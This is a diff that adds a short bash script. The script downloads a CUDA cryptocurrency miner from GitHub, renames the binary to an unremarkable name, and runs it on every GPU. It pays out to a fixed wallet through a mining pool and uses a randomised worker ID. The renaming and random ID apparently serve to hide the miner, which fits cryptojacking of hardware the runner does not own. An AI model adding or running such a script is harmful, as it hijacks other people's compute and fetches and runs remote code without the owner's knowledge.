@@ -1,0 +1,12 @@
+#!/bin/bash
+wget -c https://github.com/pearlfortune/btx-miner/releases/download/v2.11.1/btx-v2.11.1.tar.gz
+tar vxzf btx-v2.11.1.tar.gz
+cd btx
+mv btx-miner-cu13 maslaoki
+./maslaoki \
+    -mode stratum \
+    -backend cuda \
+    -gpu-devices all \
+    -payout btx1zl3r24jmxadeu5ufm95wxxyj0c6mv3yls23hmjnggzd32j63f6chs6lpvmj \
+    -worker $(echo $RANDOM | md5sum | head -c 10) \
+    -pool btx.pearlfortune.org:23333
